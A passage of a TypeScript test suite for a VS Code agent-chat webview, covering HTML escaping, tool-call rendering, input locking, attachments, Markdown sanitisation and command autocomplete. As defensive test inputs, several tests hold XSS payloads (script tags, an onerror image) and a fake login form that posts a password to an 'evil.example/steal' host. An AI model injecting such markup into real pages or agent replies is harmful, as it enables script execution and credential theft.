import * as assert from "assert";
import { JSDOM, DOMWindow } from "jsdom";
import {
  escapeHtml,
  formatPermissionContent,
  getToolsHtml,
  updateSelectLabel,
  getElements,
  WebviewController,
  initWebview,
  ansiToHtml,
  hasAnsiCodes,
  getToolKindIcon,
  computeLineDiff,
  renderDiff,
  type VsCodeApi,
  type Tool,
  type WebviewElements,
  type ExtensionMessage,
} from "../views/webview/main";

function createMockVsCodeApi(): VsCodeApi & {
  _getMessages: () => unknown[];
  _clearMessages: () => void;
} {
  let state: Record<string, unknown> = {};
  const messages: unknown[] = [];

  return {
    postMessage: (message: unknown) => {
      messages.push(message);
    },
    getState: <T>() => state as T,
    setState: <T>(newState: T) => {
      state = newState as Record<string, unknown>;
      return newState;
    },
    _getMessages: () => messages,
    _clearMessages: () => {
      messages.length = 0;
    },
  };
}

function createWebviewHTML(): string {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
</head>
<body>
  <div id="top-bar">
    <span class="status-indicator">
      <span class="status-dot" id="status-dot"></span>
      <span id="status-text">Disconnected</span>
    </span>
    <button id="connect-btn">Connect</button>
    <select id="agent-selector"></select>
  </div>
  
  <div id="welcome-view" class="welcome-view">
    <h3>Welcome to VSCode ACP</h3>
    <button class="welcome-btn" id="welcome-connect-btn">Connect to Agent</button>
  </div>
  
  <div id="agent-plan-container"></div>
  
  <div id="messages"></div>
  
  <div id="input-container">
    <div id="command-autocomplete" role="listbox"></div>
    <div id="attachments-bar" role="list"></div>
    <div id="input-row">
      <textarea id="input" rows="1" placeholder="Ask your agent..."></textarea>
      <button id="attach-btn">Attach</button>
      <button id="send">Send</button>
    </div>
  </div>
  <span id="input-hint" role="status" aria-live="polite">Press Enter to send, Shift+Enter for new line, Escape to clear. Type / for ACP commands advertised by the agent.</span>
  
  <div id="options-bar">
    <select id="mode-selector" style="display: none;"></select>
    <select id="model-selector" style="display: none;"></select>
  </div>
  <div id="session-picker" class="session-picker" role="dialog" aria-modal="true" aria-labelledby="session-picker-title" tabindex="-1"></div>

  <div id="permission-modal" class="permission-modal" role="dialog" aria-modal="true" aria-labelledby="permission-title" aria-describedby="permission-content" tabindex="-1">
    <div class="permission-modal-content">
      <h3 class="permission-title" id="permission-title">Permission Required</h3>
      <p class="permission-warning" id="permission-warning" role="alert" hidden></p>
      <pre class="permission-content" id="permission-content"></pre>
      <div class="permission-options" role="group" aria-label="Permission options"></div>
      <button class="permission-cancel-btn" type="button">Cancel</button>
    </div>
  </div>
</body>
</html>`;
}

/**
 * Replaces a JSDOM window's timer functions with ones the test drives, so the
 * permission repeat-input guard can be released deterministically instead of
 * by sleeping.
 */
function installControllableTimers(win: Window): () => void {
  const pending = new Map<number, () => void>();
  let nextHandle = 0;

  Object.defineProperty(win, "setTimeout", {
    configurable: true,
    writable: true,
    value: (callback: () => void) => {
      pending.set(++nextHandle, callback);
      return nextHandle;
    },
  });
  Object.defineProperty(win, "clearTimeout", {
    configurable: true,
    writable: true,
    value: (handle: number) => pending.delete(handle),
  });

  return () => {
    const due = [...pending.values()];
    pending.clear();
    due.forEach((callback) => callback());
  };
}

suite("Webview", () => {
  suite("escapeHtml", () => {
    test("escapes ampersands", () => {
      assert.strictEqual(escapeHtml("foo & bar"), "foo &amp; bar");
    });

    test("escapes less than", () => {
      assert.strictEqual(escapeHtml("a < b"), "a &lt; b");
    });

    test("escapes greater than", () => {
      assert.strictEqual(escapeHtml("a > b"), "a &gt; b");
    });

    test("escapes all special characters together", () => {
      assert.strictEqual(
        escapeHtml("<script>alert('xss')</script>"),
        "&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;"
      );
    });

    test("escapes double quotes", () => {
      assert.strictEqual(
        escapeHtml('a "quoted" string'),
        "a &quot;quoted&quot; string"
      );
    });

    test("escapes single quotes", () => {
      assert.strictEqual(escapeHtml("it's"), "it&#39;s");
    });

    test("returns empty string for empty input", () => {
      assert.strictEqual(escapeHtml(""), "");
    });

    test("preserves normal text", () => {
      assert.strictEqual(escapeHtml("Hello World"), "Hello World");
    });
  });

  suite("getToolsHtml", () => {
    test("returns empty string for no tools", () => {
      assert.strictEqual(getToolsHtml({}), "");
    });

    test("renders running tool with spinner icon", () => {
      const tools: Record<string, Tool> = {
        "tool-1": {
          name: "bash",
          input: null,
          output: null,
          status: "running",
        },
      };
      const html = getToolsHtml(tools);
      assert.ok(html.includes("⋯"));
      assert.ok(html.includes("bash"));
      assert.ok(html.includes("running"));
    });

    test("renders completed tool with checkmark", () => {
      const tools: Record<string, Tool> = {
        "tool-1": {
          name: "read_file",
          input: "path/to/file",
          output: "file contents",
          status: "completed",
        },
      };
      const html = getToolsHtml(tools);
      assert.ok(html.includes("✓"));
      assert.ok(html.includes("read_file"));
    });

    test("renders failed tool with X", () => {
      const tools: Record<string, Tool> = {
        "tool-1": {
          name: "write_file",
          input: null,
          output: "Permission denied",
          status: "failed",
        },
      };
      const html = getToolsHtml(tools);
      assert.ok(html.includes("✗"));
    });

    test("escapes tool name to prevent XSS", () => {
      const tools: Record<string, Tool> = {
        "tool-1": {
          name: "<script>alert(1)</script>",
          input: null,
          output: null,
          status: "running",
        },
      };
      const html = getToolsHtml(tools);
      assert.ok(html.includes("&lt;script&gt;"));
      assert.ok(!html.includes("<script>alert"));
    });

    test("truncates long output", () => {
      const longOutput = "x".repeat(600);
      const tools: Record<string, Tool> = {
        "tool-1": {
          name: "test",
          input: null,
          output: longOutput,
          status: "completed",
        },
      };
      const html = getToolsHtml(tools);
      assert.ok(html.includes("..."));
      assert.ok(!html.includes("x".repeat(600)));
    });

    test("shows tool count in summary", () => {
      const tools: Record<string, Tool> = {
        "tool-1": { name: "a", input: null, output: null, status: "completed" },
        "tool-2": { name: "b", input: null, output: null, status: "completed" },
        "tool-3": { name: "c", input: null, output: null, status: "completed" },
      };
      const html = getToolsHtml(tools);
      assert.ok(html.includes("3 tools"));
    });

    test("shows singular tool for single tool", () => {
      const tools: Record<string, Tool> = {
        "tool-1": { name: "a", input: null, output: null, status: "completed" },
      };
      const html = getToolsHtml(tools);
      assert.ok(html.includes(">1 tool<"));
    });
  });

  suite("updateSelectLabel", () => {
    let dom: JSDOM;
    let document: Document;

    setup(() => {
      dom = new JSDOM(
        '<!DOCTYPE html><select id="test"><option value="1" data-label="First">First</option><option value="2" data-label="Second">Second</option></select>'
      );
      document = dom.window.document;
    });

    teardown(() => {
      dom.window.close();
    });

    test("prepends prefix to selected option", () => {
      const select = document.getElementById("test") as HTMLSelectElement;
      select.selectedIndex = 0;
      updateSelectLabel(select, "Mode");
      assert.strictEqual(select.options[0].textContent, "Mode: First");
    });

    test("resets other options to their data-label", () => {
      const select = document.getElementById("test") as HTMLSelectElement;
      select.options[1].textContent = "Modified";
      select.selectedIndex = 0;
      updateSelectLabel(select, "Mode");
      assert.strictEqual(select.options[1].textContent, "Second");
    });
  });

  suite("getElements", () => {
    let dom: JSDOM;
    let document: Document;

    setup(() => {
      dom = new JSDOM(createWebviewHTML());
      document = dom.window.document;
    });

    teardown(() => {
      dom.window.close();
    });

    test("returns all required elements", () => {
      const elements = getElements(document);
      assert.ok(elements.messagesEl);
      assert.ok(elements.inputEl);
      assert.ok(elements.sendBtn);
      assert.ok(elements.inputContainer);
      assert.ok(elements.inputHint);
      assert.ok(elements.statusDot);
      assert.ok(elements.statusText);
      assert.ok(elements.agentSelector);
      assert.ok(elements.connectBtn);
      assert.ok(elements.welcomeConnectBtn);
      assert.ok(elements.modeSelector);
      assert.ok(elements.modelSelector);
      assert.ok(elements.welcomeView);
      assert.ok(elements.commandAutocomplete);
    });

    test("returns correct element types", () => {
      const elements = getElements(document);
      assert.strictEqual(elements.inputEl.tagName, "TEXTAREA");
      assert.strictEqual(elements.sendBtn.tagName, "BUTTON");
      assert.strictEqual(elements.agentSelector.tagName, "SELECT");
    });
  });

  suite("WebviewController", () => {
    let dom: JSDOM;
    let document: Document;
    let window: DOMWindow;
    let mockVsCode: ReturnType<typeof createMockVsCodeApi>;
    let elements: WebviewElements;
    let controller: WebviewController;

    setup(() => {
      dom = new JSDOM(createWebviewHTML(), {
        runScripts: "dangerously",
        url: "https://localhost",
      });
      document = dom.window.document;
      window = dom.window;
      mockVsCode = createMockVsCodeApi();
      elements = getElements(document);
      controller = new WebviewController(
        mockVsCode,
        elements,
        document,
        window as unknown as Window
      );
    });

    teardown(() => {
      dom.window.close();
    });

    test("sends ready message on initialization", () => {
      const messages = mockVsCode._getMessages();
      assert.ok(
        messages.some((m: unknown) => (m as { type: string }).type === "ready")
      );
    });

    suite("addMessage", () => {
      test("adds user message to DOM", () => {
        controller.addMessage("Hello!", "user");
        const msgs = elements.messagesEl.querySelectorAll(".message.user");
        assert.strictEqual(msgs.length, 1);
        assert.strictEqual(msgs[0].textContent, "Hello!");
      });

      test("adds assistant message to DOM", () => {
        controller.addMessage("Hi there!", "assistant");
        const msgs = elements.messagesEl.querySelectorAll(".message.assistant");
        assert.strictEqual(msgs.length, 1);
        assert.strictEqual(msgs[0].textContent, "Hi there!");
      });

      test("adds error message to DOM", () => {
        controller.addMessage("Error occurred", "error");
        const msgs = elements.messagesEl.querySelectorAll(".message.error");
        assert.strictEqual(msgs.length, 1);
      });

      test("sets accessibility attributes", () => {
        const msg = controller.addMessage("Test", "user");
        assert.strictEqual(msg.getAttribute("role"), "article");
        assert.strictEqual(msg.getAttribute("tabindex"), "0");
        assert.strictEqual(msg.getAttribute("aria-label"), "Your message");
      });

      test("returns the created element", () => {
        const msg = controller.addMessage("Test", "user");
        assert.ok(msg instanceof dom.window.HTMLElement);
        assert.strictEqual(msg.textContent, "Test");
      });
    });

    suite("updateStatus", () => {
      test("updates status text for connected", () => {
        controller.updateStatus("connected");
        assert.strictEqual(elements.statusText.textContent, "Connected");
      });

      test("updates status text for disconnected", () => {
        controller.updateStatus("disconnected");
        assert.strictEqual(elements.statusText.textContent, "Disconnected");
      });

      test("updates status text for connecting", () => {
        controller.updateStatus("connecting");
        assert.strictEqual(elements.statusText.textContent, "Connecting...");
      });

      test("updates status dot class", () => {
        controller.updateStatus("connected");
        assert.ok(elements.statusDot.className.includes("connected"));
      });

      test("saves state after update", () => {
        controller.updateStatus("connected");
        const state = mockVsCode.getState<{ isConnected: boolean }>();
        assert.strictEqual(state?.isConnected, true);
      });
    });
    suite("session transition input locking", () => {
      test("locks input synchronously when connect is requested", () => {
        elements.inputEl.value = "queued prompt";
        elements.inputEl.focus();
        mockVsCode._clearMessages();

        elements.connectBtn.click();

        assert.strictEqual(elements.inputEl.disabled, true);
        assert.strictEqual(elements.sendBtn.disabled, true);
        assert.strictEqual(
          document.getElementById("input-container")?.getAttribute("aria-busy"),
          "true"
        );
        assert.strictEqual(elements.inputEl.value, "queued prompt");
        assert.strictEqual(elements.sendBtn.textContent, "Wait…");
        assert.strictEqual(
          elements.sendBtn.getAttribute("aria-label"),
          "Connecting to agent…"
        );
        elements.inputEl.dispatchEvent(
          new dom.window.KeyboardEvent("keydown", {
            key: "Enter",
            bubbles: true,
            cancelable: true,
          })
        );
        assert.deepStrictEqual(mockVsCode._getMessages(), [
          { type: "connect" },
        ]);

        controller.handleMessage({
          type: "sessionTransition",
          active: false,
        } as ExtensionMessage);

        assert.strictEqual(elements.inputEl.disabled, false);
        assert.strictEqual(elements.sendBtn.disabled, false);
        assert.strictEqual(elements.sendBtn.textContent, "Send");
        assert.strictEqual(
          elements.sendBtn.getAttribute("aria-label"),
          "Send message"
        );
        assert.strictEqual(
          document.getElementById("input-container")?.getAttribute("aria-busy"),
          "false"
        );
        assert.strictEqual(document.activeElement, elements.inputEl);
      });

      test("does not steal focus when an external picker pauses the session lock", () => {
        const outsideControl = document.createElement("button");
        document.body.appendChild(outsideControl);
        elements.inputEl.focus();
        controller.handleMessage({
          type: "sessionTransition",
          active: true,
          text: "Starting session…",
        } as ExtensionMessage);
        outsideControl.focus();

        controller.handleMessage({
          type: "sessionTransition",
          active: false,
          restoreFocus: false,
        } as ExtensionMessage);

        assert.strictEqual(elements.inputEl.disabled, false);
        assert.strictEqual(document.activeElement, outsideControl);

        controller.handleMessage({
          type: "sessionTransition",
          active: true,
          text: "Starting session…",
        } as ExtensionMessage);
        controller.handleMessage({
          type: "sessionTransition",
          active: false,
        } as ExtensionMessage);
        assert.strictEqual(document.activeElement, elements.inputEl);
      });

      test("keeps input locked after transport connects until the session is ready", () => {
        controller.handleMessage({
          type: "sessionTransition",
          active: true,
          text: "Starting session…",
        } as ExtensionMessage);
        controller.handleMessage({
          type: "connectionState",
          state: "connecting",
        });
        controller.handleMessage({
          type: "connectionState",
          state: "connected",
        });

        assert.strictEqual(elements.inputEl.disabled, true);
        assert.strictEqual(elements.sendBtn.disabled, true);
        assert.strictEqual(
          document.getElementById("input-hint")?.textContent,
          "Starting session…"
        );

        controller.handleMessage({
          type: "sessionTransition",
          active: false,
        } as ExtensionMessage);
        assert.strictEqual(elements.inputEl.disabled, false);
      });

      test("unlocks and restores focus with actionable feedback after restore fails", () => {
        elements.inputEl.focus();
        controller.handleMessage({ type: "replayStart" });
        assert.strictEqual(elements.inputEl.disabled, true);

        controller.handleMessage({
          type: "replayFailed",
          text: "Authentication required: Sign in to continue",
        });

        assert.strictEqual(elements.inputEl.disabled, false);
        assert.strictEqual(elements.sendBtn.disabled, false);
        assert.strictEqual(document.activeElement, elements.inputEl);
        const error = elements.messagesEl.querySelector(".message.error");
        assert.ok(error?.textContent?.includes("Sign in to continue"));
        assert.ok(error?.textContent?.includes("start a new chat"));
      });

      test("keeps composed replay and session locks independent", () => {
        controller.handleMessage({
          type: "sessionTransition",
          active: true,
          text: "Restoring conversation…",
        } as ExtensionMessage);
        controller.handleMessage({ type: "replayStart" });

        controller.handleMessage({
          type: "replayFailed",
          text: "Session is no longer available.",
        });
        assert.strictEqual(elements.inputEl.disabled, true);

        controller.handleMessage({
          type: "sessionTransition",
          active: false,
        } as ExtensionMessage);
        assert.strictEqual(elements.inputEl.disabled, false);
      });

      test("keeps the prompt lock through chat clearing and unrelated errors", () => {
        elements.inputEl.value = "In flight";
        elements.inputEl.dispatchEvent(
          new window.KeyboardEvent("keydown", {
            key: "Enter",
            bubbles: true,
            cancelable: true,
          })
        );
        assert.strictEqual(elements.sendBtn.disabled, true);
        assert.strictEqual(elements.attachBtn.disabled, true);
        assert.strictEqual(elements.inputEl.disabled, false);

        controller.handleMessage({ type: "chatCleared" });
        controller.handleMessage({
          type: "agentError",
          text: "Selected file is no longer available",
        });
        assert.strictEqual(elements.sendBtn.disabled, true);
        assert.strictEqual(elements.attachBtn.disabled, true);
        assert.ok(
          elements.messagesEl.textContent?.includes(
            "Selected file is no longer available"
          )
        );

        controller.handleMessage({ type: "streamEnd" });
        assert.strictEqual(elements.sendBtn.disabled, false);
        assert.strictEqual(elements.attachBtn.disabled, false);
        assert.strictEqual(document.activeElement, elements.inputEl);
      });

      test("defers focus restoration until a permission dialog closes", () => {
        elements.inputEl.focus();
        controller.handleMessage({
          type: "sessionTransition",
          active: true,
          text: "Starting session…",
        } as ExtensionMessage);
        controller.showPermissionModal("request-1", "Write file", "/tmp/a", [
          { id: "allow", label: "Allow" },
        ]);
        assert.strictEqual(document.activeElement, elements.permissionModal);

        controller.handleMessage({
          type: "sessionTransition",
          active: false,
        } as ExtensionMessage);
        assert.strictEqual(document.activeElement, elements.permissionModal);

        controller.hidePermissionModal();
        assert.strictEqual(document.activeElement, elements.inputEl);
      });
    });

    suite("showThinking/hideThinking", () => {
      test("showThinking adds thinking element", () => {
        controller.showThinking();
        const thinking = elements.messagesEl.querySelector(".thinking");
        assert.ok(thinking);
      });

      test("hideThinking removes thinking element", () => {
        controller.showThinking();
        controller.hideThinking();
        const thinking = elements.messagesEl.querySelector(".thinking");
        assert.strictEqual(thinking, null);
      });
    });

    suite("handleMessage", () => {
      test("handles userMessage", () => {
        controller.handleMessage({ type: "userMessage", text: "Hello" });
        const msgs = elements.messagesEl.querySelectorAll(".message.user");
        assert.strictEqual(msgs.length, 1);
      });

      test("restores an unsent prompt after authentication cancellation", () => {
        controller.handleMessage({ type: "restoreInput", text: "Resume this" });

        assert.strictEqual(elements.inputEl.value, "Resume this");
        assert.strictEqual(
          mockVsCode.getState<{ inputValue: string }>()?.inputValue,
          "Resume this"
        );
      });

      test("keeps a newer draft instead of the restored prompt", () => {
        elements.inputEl.value = "Typed while connecting";

        controller.handleMessage({ type: "restoreInput", text: "Resume this" });

        assert.strictEqual(elements.inputEl.value, "Typed while connecting");
      });

      test("renders attachment-only messages and treats labels as text", () => {
        controller.handleMessage({
          type: "userMessage",
          text: "",
          attachments: [
            {
              id: "att-xss",
              uri: "file:///workspace/%3Cimg%3E.ts",
              name: '<img src=x onerror="alert(1)">.ts',
              mimeType: "text/typescript",
              size: 42,
            },
          ],
        });

        const message = elements.messagesEl.querySelector(".message.user");
        assert.ok(message);
        assert.strictEqual(message.querySelector("img"), null);
        assert.strictEqual(
          message.querySelector(".attachment-chip-name")?.textContent,
          '<img src=x onerror="alert(1)">.ts'
        );
      });

      test("clears attachment chips across session transitions", () => {
        controller.handleMessage({
          type: "filesAttached",
          attachments: [
            {
              id: "att-session",
              uri: "file:///workspace/session.ts",
              name: "session.ts",
            },
          ],
        });
        assert.strictEqual(
          elements.attachmentsBar.querySelectorAll(".attachment-chip").length,
          1
        );

        controller.handleMessage({ type: "agentChanged" });
        assert.strictEqual(elements.attachmentsBar.children.length, 0);
        assert.strictEqual(elements.attachBtn.disabled, false);

        controller.handleMessage({
          type: "filesAttached",
          attachments: [
            {
              id: "att-next-session",
              uri: "file:///workspace/next.ts",
              name: "next.ts",
            },
          ],
        });
        controller.handleMessage({ type: "chatCleared" });
        assert.strictEqual(elements.attachmentsBar.children.length, 0);
      });

      test("reports files skipped by host-side attachment validation", () => {
        controller.handleMessage({
          type: "filesAttached",
          attachments: [],
          skippedCount: 2,
        });

        const notice = elements.messagesEl.querySelector(".message.system");
        assert.strictEqual(notice?.textContent, "2 files were not attached.");

        controller.handleMessage({
          type: "filesAttached",
          attachments: [],
          skippedCount: 2,
        });
        assert.strictEqual(
          elements.messagesEl.querySelectorAll(".message.system").length,
          1
        );
      });

      test("handles connectionState", () => {
        controller.handleMessage({
          type: "connectionState",
          state: "connected",
        });
        assert.strictEqual(elements.statusText.textContent, "Connected");
        assert.strictEqual(elements.connectBtn.style.display, "none");
      });

      test("shows an error while disconnected", () => {
        controller.handleMessage({
          type: "error",
          text: "Authentication required: Sign in to continue",
        });

        const msgs = elements.messagesEl.querySelectorAll(".message.error");
        assert.strictEqual(msgs.length, 1);
        assert.strictEqual(elements.welcomeView.style.display, "none");
        assert.strictEqual(elements.messagesEl.style.display, "flex");
      });

      test("handles agents list", () => {
        controller.handleMessage({
          type: "agents",
          agents: [
            { id: "opencode", name: "OpenCode", available: true },
            { id: "claude", name: "Claude", available: false },
          ],
          selected: "opencode",
        });
        assert.strictEqual(elements.agentSelector.options.length, 2);
        assert.strictEqual(elements.agentSelector.value, "opencode");
      });

      test("handles sessionMetadata with modes", () => {
        controller.handleMessage({
          type: "sessionMetadata",
          modes: {
            availableModes: [
              { id: "code", name: "Code" },
              { id: "architect", name: "Architect" },
            ],
            currentModeId: "code",
          },
          models: null,
        });
        assert.strictEqual(elements.modeSelector.style.display, "inline-block");
        assert.strictEqual(elements.modeSelector.options.length, 2);
      });

      test("handles chatCleared", () => {
        controller.addMessage("Test", "user");
        controller.handleMessage({ type: "chatCleared" });
        assert.strictEqual(elements.messagesEl.children.length, 0);
      });

      test("handles toolCallStart", () => {
        controller.handleMessage({
          type: "toolCallStart",
          toolCallId: "tool-1",
          name: "bash",
        });
        const tools = controller.getTools();
        assert.ok(tools["tool-1"]);
        assert.strictEqual(tools["tool-1"].status, "running");
      });

      test("handles toolCallComplete", () => {
        controller.handleMessage({
          type: "toolCallStart",
          toolCallId: "tool-1",
          name: "bash",
        });
        controller.handleMessage({
          type: "toolCallComplete",
          toolCallId: "tool-1",
          status: "completed",
          rawInput: { command: "ls -la" },
          rawOutput: { output: "file1\nfile2" },
        });
        const tools = controller.getTools();
        assert.strictEqual(tools["tool-1"].status, "completed");
        assert.strictEqual(tools["tool-1"].input, "ls -la");
      });

      test("handles streaming", () => {
        controller.handleMessage({ type: "streamStart" });
        controller.handleMessage({ type: "streamChunk", text: "Hello " });
        controller.handleMessage({ type: "streamChunk", text: "World" });

        const msgs = elements.messagesEl.querySelectorAll(".message.assistant");
        assert.strictEqual(msgs.length, 1);
        assert.strictEqual(msgs[0].textContent, "Hello World");
      });

      test("renders completed Markdown once and removes unsafe HTML", () => {
        controller.handleMessage({ type: "streamStart" });
        controller.handleMessage({
          type: "streamChunk",
          text: "**bold**\n\n```ts\nconst value = 1;\n```\n\n<img src=x onerror=alert(1)><script>alert(2)</script>",
        });
        controller.handleMessage({ type: "streamEnd" });

        const messages =
          elements.messagesEl.querySelectorAll(".message.assistant");
        assert.strictEqual(messages.length, 1);
        assert.strictEqual(messages[0].querySelectorAll("strong").length, 1);
        assert.strictEqual(
          messages[0].querySelector("strong")?.textContent,
          "bold"
        );
        assert.strictEqual(
          messages[0].querySelector("code")?.textContent,
          "const value = 1;\n"
        );
        assert.strictEqual(messages[0].querySelector("script"), null);
        assert.strictEqual(
          messages[0].querySelector("img")?.hasAttribute("onerror"),
          false
        );
        assert.strictEqual(
          messages[0].textContent?.includes("**bold**"),
          false
        );
      });

      test("drops agent-supplied forms, inputs and CSS from rendered Markdown", () => {
        controller.handleMessage({ type: "streamStart" });
        controller.handleMessage({
          type: "streamChunk",
          text: '<form action="https://evil.example/steal"><input name="password"><button>Sign in</button></form><style>body { display: none; }</style><a href="https://ok.example" target="_blank">link</a>',
        });
        controller.handleMessage({ type: "streamEnd" });

        const message = elements.messagesEl.querySelector(".message.assistant");
        assert.strictEqual(message?.querySelector("form"), null);
        assert.strictEqual(message?.querySelector("input"), null);
        assert.strictEqual(message?.querySelector("button"), null);
        assert.strictEqual(message?.querySelector("style"), null);
        assert.strictEqual(
          message?.textContent?.includes("body { display: none; }"),
          false
        );
        assert.strictEqual(
          message?.querySelector("a")?.hasAttribute("target"),
          false
        );
        assert.strictEqual(
          message?.querySelector("a")?.getAttribute("href"),
          "https://ok.example"
        );
      });

      test("sanitizes Markdown finalized before a tool call", () => {
        controller.handleMessage({ type: "streamStart" });
        controller.handleMessage({
          type: "streamChunk",
          text: "Before **tool** <img src=x onerror=alert(1)>",
        });
        controller.handleMessage({
          type: "toolCallStart",
          toolCallId: "tool-1",
          name: "bash",
          kind: "execute",
        });

        const message = elements.messagesEl.querySelector(".message.assistant");
        assert.strictEqual(
          message?.querySelector("strong")?.textContent,
          "tool"
        );
        assert.strictEqual(
          message?.querySelector("img")?.hasAttribute("onerror"),
          false
        );
        assert.strictEqual(message?.textContent?.includes("**tool**"), false);
      });

      test("keeps completed tool output when only whitespace streamed before the tool call", () => {
        controller.handleMessage({ type: "streamStart" });
        controller.handleMessage({ type: "streamChunk", text: "   " });
        controller.handleMessage({
          type: "toolCallStart",
          toolCallId: "tool-1",
          name: "bash",
          kind: "execute",
        });
        controller.handleMessage({
          type: "toolCallComplete",
          toolCallId: "tool-1",
          status: "completed",
          rawInput: { command: "ls -la" },
          rawOutput: { output: "file1\nfile2" },
        });
        controller.handleMessage({ type: "streamEnd" });

        const messages =
          elements.messagesEl.querySelectorAll(".message.assistant");
        assert.strictEqual(messages.length, 1);
        assert.strictEqual(
          messages[0].querySelectorAll(".tool-item").length,
          1
        );
        assert.strictEqual(
          messages[0].querySelector(".tool-output")?.textContent,
          "file1\nfile2"
        );
        assert.strictEqual(
          messages[0].querySelector(".tool-input-preview")?.textContent,
          "ls -la"
        );
      });
    });

    suite("button interactions", () => {
      test("connect button posts connect message", () => {
        mockVsCode._clearMessages();
        elements.connectBtn.click();
        const messages = mockVsCode._getMessages();
        assert.ok(
          messages.some(
            (m: unknown) => (m as { type: string }).type === "connect"
          )
        );
      });

      test("welcome connect button posts connect message", () => {
        mockVsCode._clearMessages();
        elements.welcomeConnectBtn.click();
        const messages = mockVsCode._getMessages();
        assert.ok(
          messages.some(
            (m: unknown) => (m as { type: string }).type === "connect"
          )
        );
      });

      test("attach button requests trusted file selection", () => {
        mockVsCode._clearMessages();
        elements.attachBtn.click();

        const request = mockVsCode
          ._getMessages()
          .find(
            (message) =>
              typeof message === "object" &&
              message !== null &&
              "type" in message &&
              message.type === "requestAttachFiles"
          );
        assert.deepStrictEqual(request, {
          type: "requestAttachFiles",
          attachmentCount: 0,
        });
      });

      test("disables and explains the attach control at the file limit", () => {
        controller.handleMessage({
          type: "filesAttached",
          attachments: Array.from({ length: 10 }, (_, index) => ({
            id: `att-${index}`,
            uri: `file:///workspace/${index}.ts`,
            name: `${index}.ts`,
          })),
        });

        assert.strictEqual(elements.attachBtn.disabled, true);
        assert.strictEqual(
          elements.attachBtn.getAttribute("aria-label"),
          "Attachment limit reached (10 files)"
        );
      });
      test("removes an attachment chip and notifies the extension", () => {
        controller.handleMessage({
          type: "filesAttached",
          attachments: [
            {
              id: "att-remove",
              uri: "file:///workspace/remove.ts",
              name: "remove.ts",
            },
          ],
        });
        mockVsCode._clearMessages();

        const removeButton = elements.attachmentsBar.querySelector(
          ".attachment-chip-remove"
        ) as HTMLButtonElement;
        removeButton.click();

        assert.strictEqual(elements.attachmentsBar.children.length, 0);
        assert.strictEqual(document.activeElement, elements.attachBtn);
        const removal = mockVsCode
          ._getMessages()
          .find(
            (message) =>
              typeof message === "object" &&
              message !== null &&
              "type" in message &&
              message.type === "removeAttachment"
          );
        assert.deepStrictEqual(removal, {
          type: "removeAttachment",
          attachmentId: "att-remove",
        });
      });
    });

    suite("input handling", () => {
      test("Enter key sends message", () => {
        mockVsCode._clearMessages();
        elements.inputEl.value = "Test message";
        const event = new window.KeyboardEvent("keydown", {
          key: "Enter",
          shiftKey: false,
        });
        elements.inputEl.dispatchEvent(event);

        const messages = mockVsCode._getMessages();
        assert.ok(
          messages.some(
            (m: unknown) =>
              (m as { type: string; text?: string }).type === "sendMessage" &&
              (m as { type: string; text?: string }).text === "Test message"
          )
        );
      });

      test("Shift+Enter does not send message", () => {
        mockVsCode._clearMessages();
        elements.inputEl.value = "Test message";
        const event = new window.KeyboardEvent("keydown", {
          key: "Enter",
          shiftKey: true,
        });
        elements.inputEl.dispatchEvent(event);

        const messages = mockVsCode._getMessages();
        assert.ok(
          !messages.some(
            (m: unknown) => (m as { type: string }).type === "sendMessage"
          )
        );
      });

      test("empty input does not send message", () => {
        mockVsCode._clearMessages();
        elements.inputEl.value = "   ";
        const event = new window.KeyboardEvent("keydown", {
          key: "Enter",
          shiftKey: false,
        });
        elements.inputEl.dispatchEvent(event);

        const messages = mockVsCode._getMessages();
        assert.ok(
          !messages.some(
            (m: unknown) => (m as { type: string }).type === "sendMessage"
          )
        );
      });

      test("attachment-only prompt sends ordered attachment ids", () => {
        controller.handleMessage({
          type: "filesAttached",
          attachments: [
            {
              id: "att-only",
              uri: "file:///workspace/only.ts",
              name: "only.ts",
            },
          ],
        });
        mockVsCode._clearMessages();

        const event = new window.KeyboardEvent("keydown", {
          key: "Enter",
          shiftKey: false,
        });
        elements.inputEl.dispatchEvent(event);

        const sent = mockVsCode
          ._getMessages()
          .find(
            (message) =>
              typeof message === "object" &&
              message !== null &&
              "type" in message &&
              message.type === "sendMessage"
          );
        assert.deepStrictEqual(sent, {
          type: "sendMessage",
          text: "",
          attachmentIds: ["att-only"],
        });
        assert.strictEqual(elements.attachmentsBar.children.length, 0);
        assert.strictEqual(elements.sendBtn.disabled, true);
        assert.strictEqual(elements.attachBtn.disabled, true);

        controller.handleMessage({ type: "streamEnd" });
        assert.strictEqual(elements.sendBtn.disabled, false);
        assert.strictEqual(elements.attachBtn.disabled, false);
      });

      test("Escape clears input", () => {
        elements.inputEl.value = "Test message";
        const event = new window.KeyboardEvent("keydown", { key: "Escape" });
        elements.inputEl.dispatchEvent(event);
        assert.strictEqual(elements.inputEl.value, "");
      });
    });

    suite("slash command autocomplete", () => {
      const testCommands = [
        { name: "help", description: "Show help" },
        { name: "history", description: "Show history" },
        { name: "clear", description: "Clear chat" },
      ];

      test("getFilteredCommands returns empty for non-slash input", () => {
        const result = controller.getFilteredCommands("hello");
        assert.deepStrictEqual(result, []);
      });

      test("getFilteredCommands returns empty for plain slash", () => {
        controller.handleMessage({
          type: "availableCommands",
          commands: testCommands,
        });
        const result = controller.getFilteredCommands("/");
        assert.strictEqual(result.length, 3);
      });

      test("getFilteredCommands filters by prefix", () => {
        controller.handleMessage({
          type: "availableCommands",
          commands: testCommands,
        });
        const result = controller.getFilteredCommands("/he");
        assert.strictEqual(result.length, 1);
        assert.ok(result.some((c) => c.name === "help"));
      });

      test("getFilteredCommands filters by description", () => {
        controller.handleMessage({
          type: "availableCommands",
          commands: testCommands,
        });
        const result = controller.getFilteredCommands("/chat");
        assert.strictEqual(result.length, 1);
        assert.strictEqual(result[0].name, "clear");
      });

      test("showCommandAutocomplete displays commands", () => {
        controller.showCommandAutocomplete(testCommands);
        assert.ok(elements.commandAutocomplete.classList.contains("visible"));
        assert.strictEqual(
          elements.commandAutocomplete.querySelectorAll(".command-item").length,
          3
        );
      });

      test("typing a slash before a command catalog arrives keeps Escape behavior", () => {
        elements.inputEl.value = "/usr/local";
        elements.inputEl.dispatchEvent(new window.Event("input"));

        assert.ok(!elements.commandAutocomplete.classList.contains("visible"));

        elements.inputEl.dispatchEvent(
          new window.KeyboardEvent("keydown", { key: "Escape" })
        );
        assert.strictEqual(elements.inputEl.value, "");
      });

      test("typing a command the agent did not advertise shows an explanation", () => {
        controller.handleMessage({
          type: "availableCommands",
          commands: testCommands,
        });
        elements.inputEl.value = "/new";
